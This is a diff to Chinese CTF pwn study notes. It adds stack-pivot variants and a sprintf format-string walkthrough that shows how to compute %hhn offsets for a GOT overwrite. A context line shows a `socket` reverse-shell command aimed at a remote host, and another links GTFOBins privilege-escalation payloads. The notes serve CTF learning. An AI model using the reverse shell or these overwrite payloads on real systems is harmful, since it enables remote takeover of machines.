@@ -93,7 +93,7 @@ p.interactive()
 
 - 栈迁移:[ciscn_2019_es_2](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Pwn/ciscn_2019_es_2.md)
 
-栈迁移分很多种情况。第一种情况：`偏移+栈迁移目标地址-4+leave_ret`，同时目标地址直接写ropchain。第二种情况：`偏移+栈迁移目标地址+leave_ret`，目标地址先根据程序是多少位的填充4或者8个字节，再写ropchain。第三种情况，迁移的目标地址离一些重要地址比较近，比如got表，这时候就要留出一些位置，`偏移+栈迁移目标地址-0xd0+leave_ret`，目标地址先写0xd0+4个偏移再写ropchain；或者`偏移+栈迁移目标地址+leave_ret`，但是目标地址的ropchain前面加上若干个ret，抬高栈。例题：[gyctf_2020_borrowstack](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Pwn/gyctf_2020_borrowstack.md)
+栈迁移分很多种情况。第一种情况：`偏移+栈迁移目标地址-4+leave_ret`，同时目标地址直接写ropchain。第二种情况：`偏移+栈迁移目标地址+leave_ret`，目标地址先根据程序是多少位的填充4或者8个字节，再写ropchain。第三种情况，迁移的目标地址离一些重要地址比较近，比如got表，这时候就要留出一些位置，`偏移+栈迁移目标地址-0xd0+leave_ret`，目标地址先写0xd0+4个偏移再写ropchain；或者`偏移+栈迁移目标地址+leave_ret`，但是目标地址的ropchain前面加上若干个ret，抬高栈。例题：[gyctf_2020_borrowstack](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Pwn/gyctf_2020_borrowstack.md)。栈迁移的目标是让rsp/esp到我们控制的地址上去，不是只有leave;ret可以实现这个效果。假如有类似`mov rsp, rbp ; pop rbp ; ret`的gadget，一次就能迁移成功。
 
 - 菜单类栈溢出题+canary绕过+ret2libc
 
@@ -657,4 +657,17 @@ RPORT=12345
 socket -qvp '/bin/sh -i' $RHOST $RPORT
 ```
 也可以将RHOST写为`0.0.0.0`，直接把shell弹到题目机器上，无需自己的公网ip。
-- [GTFOBins](https://gtfobins.github.io/)，记录了很多利用错误配置binary提权的payload。
+- [GTFOBins](https://gtfobins.github.io/)，记录了很多利用错误配置binary提权的payload。‘
+73. [Impossible v2](https://youtu.be/obQxrfbMaHE?t=220)
+- 一题基础的格式化字符串，不过漏洞出在sprintf。题目：
+```c
+fgets(msg,0x28,stdin);
+sprintf(message,msg);
+```
+msg完全可控，那么就跟普通printf漏洞一样了，只不过输出的内容会到message里，要注意输出的长度，最好1个字节1个字节地写。
+- 可以将got表改写成某个函数的中间部分，那么调用那个函数就等于直接跳转到函数的中间部分。以前一直有点疑惑怎么计算写的偏移，今天加深了印象。假设是这么个场景：
+```
+win=0x4014c6
+original=0x401090
+```
+要把original改成win，格式化字符串偏移是7，使用`$hhn`写单字节。那么original地址处对应的是字节`0x90`，original+1处对应的是字节`0x10`，以此类推。然后写payload。payload一般像这样：`%numc%offset$hhn+addr`。offset表示addr的偏移，num是要写的字节。关键在于把加号的两部分分开，控制前半部分写的payload是程序的字长（32为4，64为8）。不到不要紧，用ljust往上取，将其patch到最近的字长的倍数。那么patch后的长度除以字长就是要加上的偏移了。如写`%34c%offset$hhn`,目前offset未知，但是根据现有的payload长度，这个offset加上一定不会超过16的长度。那就ljust补到16，addr的偏移是初始的7+16//8=9。`%34c%9$hhn+addr`
